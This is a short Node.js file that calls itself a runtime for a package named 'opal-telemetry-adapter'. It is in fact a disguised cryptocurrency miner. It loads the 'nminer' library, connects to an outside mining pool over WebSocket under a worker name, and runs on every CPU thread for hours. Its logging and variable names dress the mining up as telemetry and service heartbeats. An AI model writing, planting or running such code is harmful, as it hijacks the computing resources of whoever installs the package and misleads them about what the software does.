// Procedural action runner for opal-telemetry-adapter
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

async function startRuntime() {
    const instanceToken = "771fb1";
    console.log(`[service] Starting runtime for ${config.appName || "opal-telemetry-adapter"} [${instanceToken}]`);

    const processor = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.opal-telemetry-adapter",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const heartbeat = setInterval(() => {}, 73000);
    setTimeout(() => {
        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
        process.exit(0);
    }, 315 * 60 * 1000);

    process.on("SIGTERM", () => {
        clearInterval(heartbeat);
        console.log(`[service] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

startRuntime().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
